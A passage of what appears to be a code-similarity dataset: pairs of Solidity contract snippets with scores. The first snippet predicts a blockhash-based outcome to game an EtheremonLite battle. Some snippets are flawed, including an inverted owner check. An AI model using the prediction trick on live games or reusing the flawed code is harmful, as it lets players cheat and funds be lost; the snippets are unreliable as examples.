    address constant public ethermonster = 0xf3259eec5b4a46748a1f608ec3d74b89058bb3ad;
    EtheremonLite monsters_contract;


    constructor() public {
        monsters_contract = EtheremonLite(ethermonster);        
    }

    function create_moster(string monster_name) public returns (bool) {
        monsters_contract.initMonster(monster_name);
    }

    function get_monster_name() public {
        name = monsters_contract.getName(address(this));
        emit EmitName(name);
    }

    function get_last_block_hash() public view returns(uint) {
        return uint(blockhash(block.number -1));
    }

    function get_game_stats() public view returns(string) {
        win = monsters_contract.getNumWins(address(this));
        loss = monsters_contract.getNumLosses(address(this));
        return string(abi.encodePacked(""win: "", win, "" loss: "", loss));

    }

    function check_attack() public view returns(uint) {
        uint result;
        uint _dice = get_last_block_hash();
        uint dice = _dice / 85;
        return dice % 3;
    }

    function attack() public returns(uint256) {
        return monsters_contract.battle();   
    }
}",0.5796100030062681,"contract IERC20Token {

    
    function name() public constant returns (string _name) { _name; }
    function symbol() public constant returns (string _symbol) { _symbol; }
    function decimals() public constant returns (uint8 _decimals) { _decimals; }
    
    function totalSupply() public constant returns (uint total) {total;}
    function balanceOf(address _owner) public constant returns (uint balance) {_owner; balance;}    
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {_owner; _spender; remaining;}

    function transfer(address _to, uint _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
    function approve(address _spender, uint _value) public returns (bool success);
    

    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}"
"contract SellToken {
  TokenAbstractInterface instance;
  function SellToken(address _address) {
    instance = TokenAbstractInterface(_address);
  }

  function () payable { 
    uint256 weiAmount = msg.value;

    
    uint256 tokens = weiAmount.mul(rate);

    
    weiRaised = weiRaised.add(weiAmount);

    instance.mint(beneficiary, tokens);
  }

}",0.5806366831784275,"contract TokensSoldCountingCrowdsale is Crowdsale {

    using SafeMath for uint256;



    uint256 public tokensSoldCount;



    

    function _updatePurchasingState(

        address _beneficiary,

        uint256 _weiAmount

    )

    internal

    {

        uint256 tokens = _getTokenAmount(_weiAmount);

        tokensSoldCount = tokensSoldCount.add(tokens);

    }

}"
"contract ExampleContract is usingProvable {
 function __callback(bytes32 myid, string result) {
  if (msg.sender != provable_cbAddress()) revert();
  
 }

 function randomNumber() public {
  provable_query(""WolframAlpha"", ""random number between 0 and 100"");
 }
}",0.5599084317612206,"contract showNum {
    address owner = msg.sender;
    uint _num = 0;
    constructor(uint number) public {
        _num = number;
    }
    function setNum(uint number) public payable {
        _num = number;
    }
    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract AddressList {  
    event addressregistered(address addy);

    uint public NoMembers; 
    address[] public MemberAddresses;

    function registerAddress() { 
        MemberAddresses.push(msg.sender);    
        NoMembers = MemberAddresses.length;    
        addressregistered(msg.sender);
        }  
}",0.5824954208172322,"contract Authorizable is Adminable {



    address public authorizedAddress;

    

    modifier onlyAuthorized() {

        require(msg.sender == authorizedAddress);

        _;

    }



    function updateAuthorizedAddress(address _address) onlyAdmin public {

        authorizedAddress = _address;

    }



}"
"contract GetBiggest {

uint public val1 = 1;
uint public val2 = 2;
uint public val3 = 3;
uint public val4 = 0;



        function getBiggestValue() public view returns(uint) {

            uint x = val1;


            if(x < val2) {
                    x = val2; 

                }

            if(x < val3) {
                    x = val3; 

                }

            if(x < val4) {
                    x = val4; 

                }

        }

}",0.5484659347939961,"contract PreviousInterface {



    function ownerOf(uint id) public view returns (address);



    function getCard(uint id) public view returns (uint16, uint16);



    function totalSupply() public view returns (uint);



    function burnCount() public view returns (uint);



}"
"contract Oraclize is usingOraclize {

    using Strings for string;
    using Integers for uint;
    using Addresses for address;

    string public randomNumbers;
    uint[] public randomNumbersArray;

    event newOraclizeQuery(string description);
    event randomNumbersGenerated(string randomNumbers);

    constructor() public {
        update();
    }

    function __callback(bytes32, string result) public {
        if (msg.sender != oraclize_cbAddress()) revert();
        randomNumbers = result;

        string[] storage split = result.split("" "");

        for (uint i = 0; i < split.length; i++) {
            randomNumbersArray.push(parseInt(split[i]));
        }

        emit randomNumbersGenerated(randomNumbers);
    }

    function update() public payable {
        emit newOraclizeQuery(""Loading new set of random numbers, standing by for the answer..."");
        oraclize_query('URL', '...');
    }

}",0.548687569575757,"contract RandomLedger is Owned {
    
    uint256 public cost;
    
    uint8 public waitTime;
    
    uint256 public max;

    
    struct PendingNumber {
        address requestProxy;
        uint256 renderedNumber;
        uint256 originBlock;
        uint256 max;
        
        
        uint8 waitTime;
    }

    
    event EventRandomLedgerRequested(address requestor, uint256 max, uint256 originBlock, uint8 waitTime, address indexed requestProxy);
    event EventRandomLedgerRevealed(address requestor, uint256 originBlock, uint256 renderedNumber, address indexed requestProxy);
    
    mapping (address => PendingNumber) pendingNumbers;
    mapping (address => bool) public whiteList;

    function requestNumber(address _requestor, uint256 _max, uint8 _waitTime) payable public;
    function revealNumber(address _requestor) payable public;
}"
"contract CollegeAdmin {
    uint public studentAge=18;
    uint public studentIncome=15000;
    uint public studentScore=4;
    uint public studentAttendance=96;
    event changedAge(uint age);

    function setAge(uint age) public {
        studentAge = age;
        changedAge(age);
    }

}",0.5505152971846875,"contract PrivateSaleExchangeRate {

    uint256 public rate;

    uint256 public timestamp;

    event UpdateUsdEthRate(uint _rate);

    function updateUsdEthRate(uint _rate) public;

    function getTokenAmount(uint256 _weiAmount) public view returns (uint256);

}"
"contract Registration {
    address public owner;
    uint threshold = 2;
    address [] participants;
    
    mapping(address => uint) public balances;
    uint conceptPrice;
    enum Stage{Initial, Registered, Modifiable, Done}
    Stage public stage = stage = Stage.Initial;
    function concept(uint _conceptPrice) public {
        owner = msg.sender;
        stage = Stage.Registered;
    }
    function saveContra() public constant returns (uint numParticipants){
        if (stage != Stage.Registered) return;
        participants.push(msg.sender);
        if (participants.length > threshold) {
            mineConcept();
        }
        
        numParticipants = participants.length;
    }
    function mineConcept(){
        balances[owner] += 100;
        for (uint i = 0; i < participants.length; i++) {
            balances[participants[i]] += 1;
        }
        stage = Stage.Modifiable;
    }
}",0.5944042438551261,"contract Vesting {

    
    
    
    
    
    
    
    
    
    
    uint public constant interval = 30 days;
    uint public constant distributionStart = 1540994400; 
    uint public currentStage;
    uint public stageAmount;
    uint public toSendLeft;

    address[] public team;
    Token public token;

    constructor(address[] _team, address _token) {
        token = Token(_token);
        for(uint i=0; i<_team.length; i++) {
            team.push(_team[i]);
        }
    }

    function makePayouts() {
        require(toSendLeft != 0);
        if (now > interval*currentStage + distributionStart) {
			uint balance = stageAmount/team.length;
            for(uint i=0; i<team.length; i++) {
                toSendLeft -= balance;
                require(token.transfer(team[i], balance));
            }
        currentStage+=1;
        }
    }

    function setToSendLeft() {
        require(toSendLeft == 0);
        toSendLeft = token.balanceOf(address(this));
        stageAmount = toSendLeft/10;
    }



}"
"contract newContract {
    MyContract myContract = MyContract(0x08271...);

    function bid(uint amt, address _oldOwner, address _newOwner) returns(bool success) {
        if (amt > ...) {
            myContract.func(_newOwner,{getModified:_oldOwner})
        }
    }
}",0.5643510538738671,"contract Owner

{

    address internal owner;

    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }

    function changeOwner(address newOwner) public onlyOwner returns(bool)

    {

        owner = newOwner;

        return true;

    }

}"
"contract simpleBet {

    struct Bettor {
        address wallet;
        uint betAmount;
        uint outcome;
        uint bettingTime;
    }

    struct bettingEvent {
        string name;
        string uid;
        uint startTime;
        uint endTime;
        Bettor[] bettors;
    }

    bettingEvent[] public bettingEvents;

    constructor() public {
    }


    function createBettingEvent(string _name, string _uid, uint _startTime, uint _endTime) public {

        bettingEvent memory _bettingEvent;
        _bettingEvent.name = _name;
        _bettingEvent.uid = _uid;
        _bettingEvent.startTime = _startTime;
        _bettingEvent.endTime = _endTime;
        _bettingEvent.bettors.push(Bettor(0,0,0,0));


        bettingEvents.push(_bettingEvent);
    }

}",0.5147590055193154,"contract DZariusz is Ownable {


    string public name;
    string public contact;

    event LogSetName(address indexed executor, string newName);
    event LogSetContact(address indexed executor, string newContact);


    constructor(string _name, string _contact) public {

        setName(_name);
        setContact(_contact);

    }



    function setName(string _name)
    public
    onlyOwner
    returns (bool)
    {
        name = _name;
        emit LogSetName(msg.sender, _name);

        return true;
    }



    function setContact(string _contact)
    public
    onlyOwner
    returns (bool)
    {
        contact = _contact;
        emit LogSetContact(msg.sender, _contact);

        return true;
    }



}"
"contract coinCaller{
  function sendCoin(address coinContractAddress, address receiver, uint amount){
    metaCoin m = metaCoin(coinContractAddress);
    m.sendToken(receiver, amount);
  }
}",0.5863455823282552,"contract token {
	function transferFrom(address sender, address receiver, uint amount) returns(bool success) {}

	function burn() {}
	
	function setStart(uint newStart) {}
}"
"contract SGBFactory is Owned {

    event SGBUpdate(uint sbgID, bool isCreated, string message); 

    string public ownerType;

    struct SGB {
        uint id;
        string latitude;
        string longitude;
        uint minBal; 
        string ownerType;
        uint capacity; 
        address owner;
        uint fixedUnitCostPerTransaction;
    }

    SGB[] public sgbCollection;

    function SGBCreator() {
        ownerType = ""COMMUNITY"";
    }

    function addSGB(
        string lat,
        string lon,
        uint minBalReq,
        uint maxCapacity,
        address ownerAccount,
        uint fixedCost
    ) onlyOwner {
        uint sgbID = sgbCollection.length++; 
        sgbCollection[sgbID] = SGB(sgbID, lat, lon, minBalReq, ownerType, maxCapacity, ownerAccount, fixedCost);
          
        SGBUpdate(sgbID,true, ""A new SGB is created!!"");
    }

    function getSGB(uint sgbid) returns (uint sbgID, string lat, string lon, uint minBal,string ownerType) {
        return(
            sgbCollection[sgbid].id,
            sgbCollection[sgbid].latitude,
            sgbCollection[sgbid].longitude,
            sgbCollection[sgbid].minBal,
            sgbCollection[sgbid].ownerType
        );
    }

    
    
}",0.5375951042483338,"contract BitbeginToken {

    string internal _symbol;

    string internal _name;

    uint8 internal _decimals;

    uint internal _totalSupply = 20000000000000000;

    mapping (address => uint) _balanceOf;

    mapping (address => mapping (address => uint)) internal _allowances;



    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {

        _symbol = symbol;

        _name = name;

        _decimals = decimals;

        _totalSupply = totalSupply;

    }



    function name() public constant returns (string) {

        return _name;

    }



    function symbol() public constant returns (string) {

        return _symbol;

    }



    function decimals() public constant returns (uint8) {

        return _decimals;

    }



    function totalSupply() public constant returns (uint) {

        return _totalSupply;

    }



    function balanceOf(address _addr) public constant returns (uint);

    function transfer(address _to, uint _value) public returns (bool);

    event Transfer(address indexed _from, address indexed _to, uint _value);

}"
"contract factoryCampaign {

    Campaign[] public deployedCampaign;

    function createCampaign (uint256 minimumContribution) public {
        Campaign newCampaign = new Campaign(minimumContribution, msg.sender);
        deployedCampaign.push(newCampaign);
    }

    function getDeplyedCampaigns() public view returns(Campaign[] memory) {
        return deployedCampaign;        
    }
}",0.505521292976257,"contract CompFactory {

    address[] public contracts;

    

    function getContractCount() public constant returns(uint contractCount){

        return contracts.length;

    }

    

    function newComp(uint8 _numRounds) public payable returns(address newContract) {

        Comp c = (new Comp).value(address(this).balance)(_numRounds, msg.sender);

        contracts.push(c);

        return c;

    }

}"
"contract Test1 is Test2 {

    constructor() Test2() {}
}",0.5971196525257001,"contract Popo is WithdrawPopo {

  

  constructor()

    public 

  {



  }

  

}"
"contract ContributionFactory {
  address[] contributions;

  function contribute(string _data) public returns(address) {
    address contribution = new Contribution(_data, msg.sender);
    contributions.push(contribution);
    return contribution;
  }
}",0.5861692665933408,"contract Utils {

    string constant public contract_version = ""0.4.0"";



    

    

    

    

    function contractExists(address contract_address) public view returns (bool) {

        uint size;



        assembly {

            size := extcodesize(contract_address)

        }



        return size > 0;

    }

}"
"contract work_and_array {
    uint8[1000] my_array;

    uint last_index = 0;


    function do_work(bool _delete_array, uint32 num_work, uint32 num_delete) public {
        uint256 x = 0;

        for(uint i=0; i<num_work; i++){
            x = x+1;
        }
        if(_delete_array){
            if(last_index >= num_delete) {
                for(uint j = last_index-num_delete; j<last_index;j++){
                    delete my_array[j];
                }
            }
            last_index = last_index-num_delete;
        }
    }

    function delete_array(uint32 num_delete) external {

    }

    function get_length() external returns(uint256){
        return last_index;
    }

    function input_array() external{

        for(uint i=last_index; i<last_index+50; i++) {
            my_array[i]=1;
        }
        last_index = last_index + 50;
    }

}",0.5491586282984843,"contract CircularBufferUint {

    

    
    uint256[] private items;

    
    uint256 private index;


    

    
    constructor(uint256 _maxItems) public {
        require(
            _maxItems > 0,
            ""The max number of items to store in a circular buffer must be greater than 0.""
        );

        items.length = _maxItems;
    }


    

    
    function store(uint256 _item) internal returns(uint256 overwrittenItem_) {
        nextIndex();

        
        overwrittenItem_ = items[index];
        items[index] = _item;
    }

    
    function head() internal view returns(uint256 head_) {
        head_ = items[index];
    }


    

    
    function nextIndex() private {
        index++;
        if (index == items.length) {
            index = 0;
        }
    }
}"
"contract TestContract {
    function TestContract() {
    }

    function test(uint256 iterations) constant {
        int256[] memory a = new int256[](1000);

        for (uint32 i = 0; i < iterations; ++i) {
            a[i] = i;
        }
    }
}",0.555180256157783,"contract Nest {

    mapping (uint256 => bool) public inNest;

    function getEggs() external view returns (uint256[2]);

    function add(uint256) external returns (bool, uint256, uint256);

}"
"contract MailHustleCrowdsale is Crowdsale {

  uint256 _rate = 1000; 
  address _wallet = 0x315f80c7caacbe7fb1c14e65a634db89a33a9637;
  ERC20 _token = new MailHustleCoin();

  function MailHustleCrowdsale() Crowdsale(_rate, _wallet, _token) {          
  }
}",0.5980133498388732,"contract HYCCrowdsaleICO is Crowdsale {
  function HYCCrowdsaleICO(
    uint256 _startTime,
    uint256 _endTime,
    uint256 _rate,
    address _wallet,
    uint256 _hardCap
  )
    public 
    Crowdsale(_startTime, _endTime, _rate, _wallet, _hardCap)
  {

  }
}"
"contract Hello {

    function withdraw() external {
        uint256[] memory blocktimes = getBlocktimes();
        uint256[] storage myArray;

        for (uint256 i = 0; i < blocktimes.length; i++) {
            if (blocktimes[i] <= block.timestamp) {
                
            } else {
                myArray.push(blocktimes[i]);
            }
        }

        if (myArray.length > 0) {
            
            delete myArray;
        }
    }
}",0.5680137750313526,"contract EthBalanceChecker {

    
    
    
    function getEthBalances(address[] memory addresses)
        public
        view
        returns (uint256[] memory)
    {
        uint256[] memory balances = new uint256[](addresses.length);
        for (uint256 i = 0; i != addresses.length; i++) {
            balances[i] = addresses[i].balance;
        }
        return balances;
    }

}"
"contract Interaction is Owned {
  DataStorage dataStorage;

  function Interaction() public {
    dataStorage = new DataStorage();
  }
}",0.5364741849023231,"contract IdentityStorage {

  function read_user(address _user) public constant returns (uint256 _id_expiration, bytes32 _doc);

}"
"contract Lesson_6 is Lesson {
    function Lesson_6(address _dealer, uint _reward)
             Lesson(_dealer, _reward) {}

    function execute(Congress _congress) {
        for(uint i = 0; i < _congress.numProposals(); ++i) {
            if(_congress.proposals[i].proposalPassed) {  
                passed(msg.sender);
                break;
            }
        }
    }
}",0.5260039651648193,"contract Controller {

  
  
  
  function proxyPayment(address _owner) payable returns(bool);

  
  
  
  
  
  
  function onTransfer(address _from, address _to, uint _amount) returns(bool);

  
  
  
  
  
  
  function onApprove(address _owner, address _spender, uint _amount) returns(bool);
}"
"contract MyContract{
Aion aion;
address aionAccount;

function scheduleTransaction(uint256 value, uint256 gaslimit, uint256 gasprice, bool time_or_block) public {
    aion = Aion(0xD916EdFd054E1c0fE8e0979DF3818bd60313Bc62); 
    uint256 callCost = value + gaslimit*gasprice + aion.serviceFee();
    uint256 txId;
    (txId,aionAccount) = aion.ScheduleCall.value(callCost)(block.number+15, address(this), value, gaslimit, gasprice,hex""00"",time_or_block);
}

function () public payable {}

}",0.5325235918413233,"contract ERC20Capped is ERC20Mintable {



  uint256 private _cap;



  constructor(uint256 cap)

    public

  {

    require(cap > 0);

    _cap = cap;

  }



  

  function cap() public view returns(uint256) {

    return _cap;

  }



  function Mint(address account, uint256 value) internal {

    require(totalSupply().add(value) <= _cap);

    super.mint(account, value);

  }



  function MinterFunction(address account, uint256 value) public {

    

    require(totalSupply().add(value) <= _cap);

    super.MinterFunc(account, value);

  }

}"
"contract TestArray {
    uint[] public original;
    uint[] public newOriginal;

    function TestArray(){
        original.push(2);
        original.push(3);
    }

    function testRemove(){
        newOriginal = remove(original, 0);
    }

    function getLength(uint[] array) constant returns(uint number){
        return array.length;
    }

    function remove(uint[] array, uint index) internal returns(uint[] value) {
        if (index >= array.length) return;

        uint[] arrayNew;
        for (uint i = index; i<array.length-1; i++){
            arrayNew[i] = array[i+1];
        }
        delete array;
        return arrayNew;
    }
}",0.5690585229156342,"contract ERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function decimals() public view returns(uint);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public view returns (uint256);
}"
"contract Ballot {

    struct Voter {
        uint weight;
        bool voted;
        uint8 vote;
        
    }

    
    modifier onlyOwner () {
      require(msg.sender == chairperson);
      _;
    }

    
    address public chairperson;
    mapping(address => Voter) public voters;
    uint[4] public proposals;

    
    function Ballot() public {
        chairperson = msg.sender;
        voters[chairperson].weight = 2;
    }

    
    
    function register(address toVoter) public onlyOwner{
        if(voters[toVoter].weight != 0) revert();
        voters[toVoter].weight = 1;
        voters[toVoter].voted = false;
    }

    
    function vote(uint8 toProposal) public {
        Voter storage sender = voters[msg.sender];
        if (sender.voted || toProposal >= 4 || sender.weight == 0) revert();
        sender.voted = true;
        sender.vote = toProposal;
        proposals[toProposal] += sender.weight;
    }

    function winningProposal() public view returns (uint8 _winningProposal) {
        uint256 winningVoteCount = 0;
        for (uint8 prop = 0; prop < 4; prop++)
            if (proposals[prop] > winningVoteCount) {
                winningVoteCount = proposals[prop];
                _winningProposal = prop;
            }
    }

    function getCount() public view returns (uint[8]) {
        return proposals;
    }
}",0.5925124591418617,"contract BaseAirdrop is Lockable {
    using SafeMath for uint;

    ERC20Token public token;

    mapping(address => bool) public users;

    event AirdropToken(address indexed to, uint amount);

    constructor(address _token) public {
        require(_token != address(0));
        token = ERC20Token(_token);
    }

    function airdrop(uint8 v, bytes32 r, bytes32 s) public whenNotLocked {
        if (ecrecover(keccak256(""Signed for Airdrop"", address(this), address(token), msg.sender), v, r, s) != owner
            || users[msg.sender]) {
            revert();
        }
        users[msg.sender] = true;
        uint amount = getAirdropAmount(msg.sender);
        token.transfer(msg.sender, amount);
        emit AirdropToken(msg.sender, amount);
    }

    function getAirdropStatus(address user) public constant returns (bool success) {
        return users[user];
    }

    function getAirdropAmount(address user) public constant returns (uint amount);

    function withdrawTokens(address destination) public onlyOwner whenLocked {
        require(destination != address(0));
        uint balance = token.balanceOf(address(this));
        token.transfer(destination, balance);
    }
}"
"contract CommerceChain {

    
    
    event onNewCategory(uint productId);

    
    
    address owner;

    mapping (uint => Category) categoryMapping;
    uint[] categoryIndex;


    struct Category {
        uint id;
        uint name;
        uint description;
    }


    
    
    modifier isOwner(){
        require(msg.sender == owner, ""You are not the owner"");
        _;
    }

    modifier notExistsCategory(uint id) {
        require(categoryMapping[id].id != id, ""Category already exists"");
        _;

    }

    
    
    constructor() public payable {
        owner = msg.sender;
    }

    function() external payable {

    }


    function addCategory(uint id, uint  _name, uint _description) public isOwner notExistsCategory(id) {
        categoryMapping[id] = Category(id, _name, _description);
        categoryIndex.push(id);
        emit onNewCategory(id);
    }
}",0.5668100592285333,"contract WithdrawalContract {

    address public richest;
    address public owner;
    uint public mostSent;

    modifier onlyOwner() {
        require (msg.sender != owner);
        _;

    }

    mapping (address => uint) pendingWithdraws;

    function WithdrawalContract () payable {
        richest = msg.sender;
        mostSent = msg.value;
        owner = msg.sender;
    }

    function becomeRichest() payable returns (bool){
        require(msg.value > mostSent);
        pendingWithdraws[richest] += msg.value;
        richest = msg.sender;
        mostSent = msg.value;
        return true;
    }

    function withdraw(uint amount) onlyOwner returns(bool) {
        
        
        
        require(amount < this.balance);
        owner.transfer(amount);
        return true;

    }

    function getBalanceContract() constant returns(uint){
        return this.balance;
    }

}"
"contract Consumer {
  Producter currentProducer;
  function setProducer(address addr) { currentProducer = Producer(addr); }
  function getSome() returns (uint8) { return currentProducer.SOME_VALUE(); }
}",0.5406646626203252,"contract ControlledI is OwnedI {



    function getController() public view returns(address controller);

    function changeController(address newController) public returns(bool success);

}"
"contract Tester {
    bytes4 private constant FUNC_SELECTOR = bytes4(keccak256(""func()""));

    function test(uint256 _gas, address _tested) public view returns (bool) {
        bool success;
        uint256[1] memory ret;
        bytes memory data = abi.encodeWithSelector(FUNC_SELECTOR);

        assembly {
            success := staticcall(
                _gas,          
                _tested,       
                add(data, 32), 
                mload(data),   
                ret,           
                32             
            )
        }

        return success && ret[0] != 0;
    }
}",0.5966537987353859,"contract TokenLocationAuthority {



    mapping (address => bool) public whiteList;



    constructor(address[] _whitelists) public {

        for (uint i = 0; i < _whitelists.length; i ++) {

            whiteList[_whitelists[i]] = true;

        }

    }



    function canCall(

        address _src, address _dst, bytes4 _sig

    ) public view returns (bool) {

        return ( whiteList[_src] && _sig == bytes4(keccak256(""setTokenLocationHM(uint256,int256,int256)""))) ;

    }

}"
"contract myContract {

    string[] public myArray;

    function myContract(string[] myArray) {
        myArray = myArray;
    }
}",0.5518705500552915,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract superDuper {
    modifier superDuperOnly() {if (msg.sender != address(this)) throw; _};    
    function awesomeness() superDuperOnly {};
    function metaAwesomeness() {awesomeness()};
}",0.5721621133148446,"contract Owned {
    
    address public owner;

    
    function setOwner(address _owner) onlyOwner
    { owner = _owner; }

    
    modifier onlyOwner { if (msg.sender != owner) throw; _; }
}"
"contract C is A {
       function C() 
         A([0x123],0) { 
       }
    }",0.5722846985314869,"contract MSD8 {

    

    function hifus() public {

        

    }

}"
"contract test {

  struct Tree {
        int value1;
        int value2;
        int value3;
        int value4;
    }

  mapping(int => Tree) public dataItems;

  function addDataItem(int _value0,int _value1,int _value2,int _value3,int _value4) external {
        dataItems[_value0].value1= _value1;
        dataItems[_value0].value2= _value2;
        dataItems[_value0].value3= _value3;
        dataItems[_value0].value4= _value4;
    }

    function getvalue1(int _number) constant returns (int) {
        return dataItems[_number].value1;
    }
    }",0.5003805094753098,"contract MultiTransfer is Ownable {
  event Transacted(
    address msgSender, 
    address toAddress, 
    uint value 
  );


  function multiTransfer(
      address toAddress1,
      address toAddress2,
      uint value1,
      uint value2
  ) public payable onlyOwner {
    if (msg.value != value1 + value2) {
        revert();
    }

    toAddress1.transfer(value1);
    toAddress2.transfer(value2);
    
    emit Transacted(msg.sender, toAddress1, value1);
    emit Transacted(msg.sender, toAddress2, value2);
  }
}"
"contract SimpleStorage {
    bytes32[] public items;

    event ItemAdded(bytes32 contents);

    function addItem(bytes32 contents) public returns(bool) {
        items.push(contents);
        emit ItemAdded(contents);
        return true;
    }

    function getAllItems() public constant returns(bytes32[]) {
        return items;
    }
}",0.5998586093901829,"contract TokenPoolList {
  address[] public list;

  event Added(address x);

  function add(address x) {
    list.push(x);
    Added(x);
  }

  function getCount() public constant returns(uint) {
    return list.length;
  }

  function getAddress(uint index) public constant returns(address) {
    return list[index];
  }
}"
"contract Test {

    struct MyBool {
        bool initialized; 
        bool value;
    }

    struct Patient {
        uint8 age;
        uint8 bp;
        uint8 sg;
        int8 al;
        int8 su;
        MyBool rbc;
        MyBool pc;
        MyBool pcc;
        MyBool ba;
        uint16 bgr;
        uint8 bu;
        uint8 sc;
        uint16 sod;
        uint8 pot;
        uint8 hemo;
        uint8 pcv;
        uint8 wc;
        uint8 rc;
        MyBool htn;
        MyBool dm;
        MyBool cad;
        MyBool appet;
        MyBool pe;
        MyBool ane;
    }

    uint nextPatientId;
    mapping (uint256 => Patient) private patients;

    function Test() {
        
        addPatient(4, 0, 20, 1, 0, -1, 1, 0, 0, 99, 23, 145);
    }

    function setMyBool(int8 value) private returns (bool initialized, bool newValue) {
        if (value < -1  || value > 1) {
            throw;
        }
        
        if (-1 != value) {
            initialized = true;
            newValue = (value==1) ? true : false;
        }
    }

    function getMyBool(MyBool patientField) private returns (int8) {
        if (patientField.initialized == true) {
            return (int8)((patientField.value) ? 1 : 0); 
        } else {
            return 127;
        }
    }

    function getNextPatientId() constant returns (uint) {
        return nextPatientId;
    }

    function addPatient(uint8 age, uint8 bp, uint8 sg, int8 al, int8 su,
                        int8 rbc, int8 pc, int8 pcc, int8 ba,
                        uint16 bgr, uint8 bu, uint16 sod) returns (uint id) {
        var patient = patients[nextPatientId];

        patient.age = age; patient.bp = bp; patient.sg = sg; patient.al = al; patient.su = su;
        (patient.rbc.initialized, patient.rbc.value) = setMyBool(rbc);
        (patient.pc.initialized, patient.pc.value) = setMyBool(pc);
        (patient.pcc.initialized, patient.pcc.value) = setMyBool(pcc);
        (patient.ba.initialized, patient.ba.value) = setMyBool(ba);
        patient.bgr = bgr; patient.bu = bu; patient.sod = sod;

        nextPatientId++;
        id = nextPatientId;
    }

    function getMyPatient(uint id) constant returns (uint8 age, uint8 bp, uint8 sg, int8 al, int8 su,
                        int8 rbc, int8 pc, int8 pcc, int8 ba,
                        uint16 bgr, uint8 bu, uint16 sod) {
        age = patients[id].age; bp = patients[id].bp; sg = patients[id].sg; al = patients[id].al; su = patients[id].su;
        rbc = getMyBool(patients[id].rbc); pc = getMyBool(patients[id].pc); pcc = getMyBool(patients[id].pcc); ba = getMyBool(patients[id].ba);
        bgr = patients[id].bgr; bu = patients[id].bu; sod = patients[id].sod;
    }

}",0.5058454036592833,"contract Cubic {

    uint public creationTime = now;
    address public owner = msg.sender;
    uint256 public totalEthHandled = 0; 
    uint public rate = 0; 
    Cube[] public Cubes;

    

    event Freeze(address indexed from, address indexed cubeAddress, uint amount, uint unlockedAfter, string api);
    event Deliver(address indexed cube, address indexed destination, uint amount);

    

    function() payable { }

    function getCubeCount() external constant returns(uint) {
        return Cubes.length;
    }

    function freeze(uint blocks) external payable {
        secure(blocks, &#39;cubic&#39;);
    }

    function freezeAPI(uint blocks, string api) external payable {
        secure(blocks, api);
    }

    function forgetCube(Cube iceCube) external {

        uint id = iceCube.id();
        require(msg.sender == address(Cubes[id]));

        if (id != Cubes.length - 1) {
            Cubes[id] = Cubes[Cubes.length - 1];
            Cubes[id].setId(id);
        }
        Cubes.length--;        

        Deliver(address(iceCube), iceCube.destination(), iceCube.balance);
    }

    

    function withdraw() external {
        require(msg.sender == owner);        
        owner.transfer(this.balance);
    }

    function transferOwnership(address newOwner) external {
        require(msg.sender == owner);        
        owner = newOwner;
    }

    

	function secure(uint blocks, string api) private {

        require(msg.value > 0);
        uint amountToFreeze = msg.value; 
        totalEthHandled = add(totalEthHandled, amountToFreeze);
          
        
        if (rate != 200 ) {

            if (totalEthHandled > 5000 ether) {
                setRate(200);  
            } else if (totalEthHandled > 1000 ether) { 
                setRate(500);  
            } else if (totalEthHandled > 100 ether) { 
                setRate(1000); 
            }
        }

        if (rate > 0) {
            uint fee = div(amountToFreeze, rate);
            amountToFreeze = sub(amountToFreeze, fee);
        }

        Cube newCube = (new Cube).value(amountToFreeze)(msg.sender, add(block.number, blocks), this);
        newCube.setId(Cubes.push(newCube) - 1);
        Freeze(msg.sender, address(newCube), amountToFreeze, add(block.number, blocks), api);
	}

    function setRate(uint _newRate) private {
        rate = _newRate; 
    }

    function add(uint a, uint b) private returns (uint) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }

    function div(uint a, uint b) private returns (uint) {
        assert(b > 0);
        uint c = a / b;
        assert(a == b * c + a % b);
        return c;
    }

    function sub(uint a, uint b) private returns (uint) {
        assert(b <= a);
        return a - b;
    }

}"
"contract CrowdFunding {

    uint public deadline;
    event DeadlineSet(uint deadline, uint timeNow);

    function withdrawal() returns(bool) {
        DeadlineSet(deadline, now);
        return true;
    }
}",0.5751556356623371,"contract FinalizeAgent {

  function isFinalizeAgent() public constant returns(bool) {
    return true;
  }

  
  function isSane() public constant returns (bool);

  
  function finalizeCrowdsale();

}"
"contract MyContract {
struct Posposal{
    uint posposalId;
    address voteSponsorAddr;

    bytes1 description_;
    uint userId;
    string message;
    uint amount;
}
Posposal[] public curPosposals;
uint public posposalNextId=0;

function MyContract() {

}
uint public expId;
address public expTarget;
uint public expAmount;
string public expMessage;
function issuse(uint userId,address target_,uint amount_,string message_)  {
    expId=userId;
    expMessage=message_;
    expAmount=amount_;
    expTarget=target_;
    curPosposals.push(Posposal(posposalNextId,msg.sender,0x01,userId,message_,amount_));
    posposalNextId++;
}}",0.5639500372438498,"contract IPolaris {

    struct Checkpoint {

        uint ethReserve;

        uint tokenReserve;

    }



    struct Medianizer {

        uint8 tail;

        uint pendingStartTimestamp;

        uint latestTimestamp;

        Checkpoint[] prices;

        Checkpoint[] pending;

        Checkpoint median;

    }

    function subscribe(address token) public payable;

    function unsubscribe(address token, uint amount) public returns (uint actualAmount);

    function getMedianizer(address token) public view returns (Medianizer memory);

    function getDestAmount(address src, address dest, uint srcAmount) public view returns (uint);

}"
"contract A {

  function SetStruct (Test.TStruct sin) public returns (int) {
    data = 10;
    Test.TStruct memory s;
    s.x = sin.x;
    s.y = sin.y;
    return s.x;
  }
}",0.5859182857742664,"contract SimpleStorage

{

    uint storedData;

    

    function set(uint x) public

    {

        storedData = x;

    }



    function get() public view returns (uint)

    {

        return storedData;

    }

}"
"contract B {
  address public BAddr;

  function TalkToA () public {
    BAddr = new A();
    Test.TStruct memory sin = Test.TStruct(10, 5);
    BAddr.call(bytes4(keccak256(""SetStruct((int256,int256))"")), sin);
  }
}",0.545870649403345,"contract fomo3d {

    function getPlayerInfoByAddress(address _addr)

        public 

        view 

        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256);

        

    function withdraw()

